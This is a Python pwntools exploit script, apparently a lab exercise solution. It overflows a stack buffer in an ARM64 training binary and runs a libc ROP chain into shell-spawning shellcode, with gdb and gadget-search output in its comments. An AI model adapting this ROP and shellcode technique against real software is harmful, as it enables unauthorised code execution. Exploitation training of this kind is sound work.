#!/usr/bin/python

"""
(gdb) disassemble main 
Dump of assembler code for function main:
   0x00000000004006c0 <+0>:	stp	x29, x30, [sp, #-32]!
...
   0x00000000004006d8 <+24>:	ldp	x29, x30, [sp], #32
   0x00000000004006dc <+28>:	ret
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x40067c: file src/05-shellcode-dynamic.c, line 6.
(gdb) b *0x00000000004006d8
Breakpoint 2 at 0x4006d8: file src/05-shellcode-dynamic.c, line 20.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/05-shellcode-dynamic.c:6
6		printf("> ");
(gdb) p &buffer[0]
$1 = 0x40007ffd80 ""
(gdb) c
Continuing.

Breakpoint 2, main (argc=1650614882, argv=0x6262626262626262) at src/05-shellcode-dynamic.c:20
20	}
(gdb) i r $sp
sp             0x40007ffe00	0x40007ffe00
"""

"""
$ qemu-aarch64 -L /usr/aarch64-linux-gnu/ -strace ./bin/arm64/05-shellcode-dynamic
...
20548 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
20548 mmap(NULL,1413976,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0x0000004000852000
...
"""

"""
$ ropper --nocolor --file /usr/aarch64-linux-gnu/lib/libc-2.27.so
0x0003c424: ldp x19, x20, [sp, #0x10]; ldp x21, x22, [sp, #0x20]; ldp x23, x24, [sp, #0x30]; ldp x27, x28, [sp, #0x50]; ldp x29, x30, [sp], #0x70; ret; 
0x000f32e4: mov x4, x20; mov x3, x24; mov x0, x23; blr x22;
0x0003eeac: add x0, sp, #0x50; ldr x4, [x4]; eor x3, x3, x4; blr x3;
0x0002071c: blr x0;
"""

import struct
import sys

from pwn import *

context(arch='aarch64', os='linux', endian='little', word_size=64)

binary_path = './bin/arm64/05-shellcode-dynamic'
libc_path = '/usr/aarch64-linux-gnu/lib/libc-2.27.so'

saved_x30_addr = 0x40007ffe00 + 8
buffer_addr = 0x40007ffd80
libc_addr = 0x0000004000852000

ldp_x_many_ret_addr = libc_addr + 0x0003c424
mov_x4_x20_x3_x24_blr_x22_addr = libc_addr + 0x000f32e4
add_x0_sp_0x50_blr_x3_addr = libc_addr + 0x0003eeac
blr_x0_addr = libc_addr + 0x0002071c

libc = ELF(libc_path)
null_addr = libc_addr + libc.search(p64(0)).next()

shellcode = asm(shellcraft.sh())

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (saved_x30_addr - buffer_addr)
payload += p64(ldp_x_many_ret_addr)
payload += 'b' * 16
# <- $sp
payload += p64(0) # x29
payload += p64(mov_x4_x20_x3_x24_blr_x22_addr) # x30
payload += p64(0) # x19
payload += p64(null_addr) # x20 -> x4
payload += p64(0) # x21
payload += p64(add_x0_sp_0x50_blr_x3_addr) # x22
payload += p64(0) # x23
payload += p64(blr_x0_addr) # x24 -> x3
payload += 'd' * 0x10
payload += p64(0) # x27
payload += p64(0) # x28
payload += 'e' * 0x10
# <- $sp
payload += 'f' * 0x50
payload += shellcode

p.readuntil('> ')
p.write(payload)
p.interactive()
